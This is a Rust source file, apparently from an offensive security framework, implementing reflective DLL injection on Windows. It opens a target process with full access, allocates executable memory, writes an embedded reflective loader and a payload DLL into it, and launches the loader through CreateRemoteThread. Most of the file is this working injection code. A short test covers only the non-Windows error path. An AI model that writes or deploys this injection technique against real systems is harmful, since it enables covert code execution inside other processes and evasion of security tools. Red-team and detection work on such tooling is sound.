use alloc::string::String;
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
use {
    object::LittleEndian as LE,
    object::{Object, ObjectSection},
    std::{os::raw::c_void, ptr::null_mut},
    windows_sys::Win32::Security::SECURITY_ATTRIBUTES,
    windows_sys::Win32::System::Threading::CreateRemoteThread,
    windows_sys::Win32::{
        Foundation::{FALSE, GetLastError, HANDLE},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
                VIRTUAL_ALLOCATION_TYPE, VirtualAllocEx,
            },
            Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS, PROCESS_ALL_ACCESS},
        },
    },
    windows_sys::core::BOOL,
};

#[cfg(all(host_family = "windows", target_os = "windows"))]
macro_rules! win_target {
    () => {
        r"x86_64-pc-windows-msvc"
    };
}
#[cfg(all(host_family = "unix", target_os = "windows"))]
macro_rules! win_target {
    () => {
        r"x86_64-pc-windows-gnu"
    };
}

#[cfg(all(host_family = "unix", target_os = "windows"))]
macro_rules! sep {
    () => {
        "/"
    };
}

#[cfg(host_family = "windows")]
macro_rules! sep {
    () => {
        r#"\"#
    };
}

#[cfg(target_os = "windows")]
const LOADER_BYTES: &[u8] = include_bytes!(concat!(
    "..",
    sep!(),
    "..",
    sep!(),
    "..",
    sep!(),
    "..",
    sep!(),
    "..",
    sep!(),
    "..",
    sep!(),
    "..",
    sep!(),
    "bin",
    sep!(),
    "reflective_loader",
    sep!(),
    "target",
    sep!(),
    "x86_64-pc-windows-msvc",
    sep!(),
    "release",
    sep!(),
    "reflective_loader.dll"
));

#[cfg(target_os = "windows")]
fn open_process(
    dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
    binherithandle: BOOL,
    dwprocessid: u32,
) -> anyhow::Result<HANDLE> {
    let process_handle: HANDLE =
        unsafe { OpenProcess(dwdesiredaccess, binherithandle, dwprocessid) };
    if process_handle == std::ptr::null_mut() {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!(
                "Failed to open process {}. Last error returned: {}",
                dwprocessid,
                error_code
            ));
        }
    }
    Ok(process_handle)
}

#[cfg(target_os = "windows")]
fn virtual_alloc_ex(
    hprocess: HANDLE,
    lpaddress: *const c_void,
    dwsize: usize,
    flallocationtype: VIRTUAL_ALLOCATION_TYPE,
    flprotect: PAGE_PROTECTION_FLAGS,
) -> anyhow::Result<*mut c_void> {
    let buffer_handle: *mut c_void =
        unsafe { VirtualAllocEx(hprocess, lpaddress, dwsize, flallocationtype, flprotect) };
    if buffer_handle.is_null() {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!(
                "Failed to allocate memory. Last error returned: {}",
                error_code
            ));
        }
    }
    Ok(buffer_handle)
}

#[cfg(target_os = "windows")]
fn write_process_memory(
    hprocess: HANDLE,
    lpbaseaddress: *const c_void,
    lpbuffer: *const c_void,
    nsize: usize,
) -> anyhow::Result<usize> {
    let mut lpnumberofbyteswritten: usize = 0;
    let write_res = unsafe {
        WriteProcessMemory(
            hprocess,
            lpbaseaddress,
            lpbuffer,
            nsize,
            &mut lpnumberofbyteswritten,
        )
    };
    if write_res == FALSE || lpnumberofbyteswritten == 0 {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!(
                "Failed to write process memory. Last error returned: {}",
                error_code
            ));
        }
    }
    Ok(lpnumberofbyteswritten)
}

#[cfg(target_os = "windows")]
fn create_remote_thread(
    hprocess: *mut c_void,
    lpthreadattributes: *const SECURITY_ATTRIBUTES,
    dwstacksize: usize,
    lpstartaddress: Option<*mut c_void>,
    lpparameter: *const c_void,
    dwcreationflags: u32,
    lpthreadid: *mut u32,
) -> anyhow::Result<*mut c_void> {
    let tmp_lpstartaddress: Option<unsafe extern "system" fn(_) -> _> = match lpstartaddress {
        Some(local_lpstartaddress) => Some(unsafe { std::mem::transmute(local_lpstartaddress) }),
        None => todo!(),
    };
    let res = unsafe {
        CreateRemoteThread(
            hprocess,
            lpthreadattributes,
            dwstacksize,
            tmp_lpstartaddress,
            lpparameter,
            dwcreationflags,
            lpthreadid,
        )
    };
    if res == std::ptr::null_mut() {
        let error_code = unsafe { GetLastError() };
        if error_code != 0 {
            return Err(anyhow::anyhow!(
                "Failed to create remote thread. Last error returned: {}",
                error_code
            ));
        }
    }
    Ok(res)
}

#[cfg(target_os = "windows")]
fn get_export_address_by_name(
    pe_bytes: &[u8],
    export_name: &str,
    in_memory: bool,
) -> anyhow::Result<usize> {
    let pe_file = object::read::pe::PeFile64::parse(pe_bytes)?;

    let section = match pe_file.section_by_name(".text") {
        Some(local_section) => local_section,
        None => return Err(anyhow::anyhow!(".text section not found")),
    };

    let mut section_raw_data_ptr = 0x0;
    for section in pe_file.section_table().iter() {
        let section_name = String::from_utf8(section.name.to_vec())?;
        if section_name.contains(".text") {
            section_raw_data_ptr = section.pointer_to_raw_data.get(LE);
            break;
        }
    }
    if section_raw_data_ptr == 0x0 {
        return Err(anyhow::anyhow!("Failed to find pointer to text section."));
    }

    // Section offset for .text.
    let rva_offset = section.address() as usize
        - section_raw_data_ptr as usize
        - pe_file.relative_address_base() as usize;

    let exported_functions = pe_file.exports()?;
    for export in exported_functions {
        if export_name == String::from_utf8(export.name().to_vec())?.as_str() {
            if in_memory {
                return Ok(export.address() as usize - pe_file.relative_address_base() as usize);
            } else {
                return Ok(export.address() as usize
                    - rva_offset
                    - pe_file.relative_address_base() as usize);
            }
        }
    }

    Err(anyhow::anyhow!("Function {} not found", export_name))
}

#[allow(dead_code)]
#[cfg(target_os = "windows")]
struct UserData {
    function_offset: u64,
}

#[cfg(target_os = "windows")]
fn handle_dll_reflect(
    target_dll_bytes: Vec<u8>,
    pid: u32,
    function_name: &str,
) -> anyhow::Result<()> {
    let loader_function_name = "reflective_loader";
    let reflective_loader_dll = LOADER_BYTES;

    let target_function = get_export_address_by_name(&target_dll_bytes, function_name, true)?;
    let user_data = UserData {
        function_offset: target_function as u64,
    };

    let image_size = reflective_loader_dll.len();

    let process_handle: *mut std::ffi::c_void = open_process(PROCESS_ALL_ACCESS, 0, pid)?;

    let remote_buffer = virtual_alloc_ex(
        process_handle,
        null_mut(),
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )?;

    let _loader_bytes_written = write_process_memory(
        process_handle,
        remote_buffer as _,
        reflective_loader_dll.as_ptr() as _,
        image_size,
    )?;

    let remote_buffer_user_data: *mut std::ffi::c_void = virtual_alloc_ex(
        process_handle,
        null_mut(),
        std::mem::size_of::<UserData>(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )?;

    let user_data_ptr: *const UserData = &user_data as *const UserData;
    let _user_data_bytes_written = write_process_memory(
        process_handle,
        remote_buffer_user_data as _,
        user_data_ptr as *const _,
        std::mem::size_of::<UserData>(),
    )?;

    let user_data_ptr_size = std::mem::size_of::<u64>();
    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
        process_handle,
        null_mut(),
        user_data_ptr_size + target_dll_bytes.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )?;

    let user_data_ptr_as_bytes = (remote_buffer_user_data as usize).to_le_bytes();
    let user_data_ptr_in_remote_buffer = remote_buffer_target_dll as usize;
    let _payload_bytes_written = write_process_memory(
        process_handle,
        user_data_ptr_in_remote_buffer as _,
        user_data_ptr_as_bytes.as_slice().as_ptr() as *const _,
        user_data_ptr_size,
    )?;

    let payload_ptr_in_remote_buffer = remote_buffer_target_dll as usize + user_data_ptr_size;
    let _payload_bytes_written = write_process_memory(
        process_handle,
        payload_ptr_in_remote_buffer as _,
        target_dll_bytes.as_slice().as_ptr() as _,
        target_dll_bytes.len(),
    )?;

    let loader_address_offset =
        get_export_address_by_name(reflective_loader_dll, loader_function_name, false)?;
    let loader_address = loader_address_offset + remote_buffer as usize;

    let _thread_handle = create_remote_thread(
        process_handle,
        null_mut(),
        0,
        Some(loader_address as *mut c_void),
        remote_buffer_target_dll,
        0,
        null_mut(),
    )?;

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn dll_reflect(_dll_bytes: Vec<u8>, _pid: u32, _function_name: String) -> anyhow::Result<()> {
    Err(anyhow::anyhow!(
        "This OS isn't supported by the dll_reflect function.\nOnly windows systems are supported"
    ))
}

#[cfg(target_os = "windows")]
pub fn dll_reflect(dll_bytes: Vec<u8>, pid: u32, function_name: String) -> anyhow::Result<()> {
    // V1 converted Vec<u32> to Vec<u8>. V2 takes Vec<u8> directly.
    handle_dll_reflect(dll_bytes, pid, function_name.as_str())?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
mod tests {

    #[test]
    fn test_dll_reflect_non_windows_test() -> anyhow::Result<()> {
        let res = super::dll_reflect(Vec::new(), 0, "Garbage".to_string());
        match res {
            Ok(_) => return Err(anyhow::anyhow!("dll_reflect should have errored out.")),
            Err(local_err) => assert!(
                local_err
                    .to_string()
                    .contains("This OS isn't supported by the dll_reflect")
            ),
        }
        Ok(())
    }
}
